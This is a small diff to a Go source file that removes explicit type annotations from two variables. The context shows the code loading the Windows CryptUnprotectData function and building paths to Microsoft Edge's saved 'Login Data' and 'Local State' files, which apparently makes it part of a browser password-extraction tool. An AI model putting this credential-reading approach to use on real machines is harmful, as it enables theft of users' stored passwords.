@@ -31,8 +31,8 @@ var (
 	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
 	procLocalFree   = dllkernel32.NewProc("LocalFree")
 
-	dataPathEdge       string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
-	localStatePathEdge string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"
+	dataPathEdge       = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
+	localStatePathEdge = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"
 )
 
 type DataBlob struct {
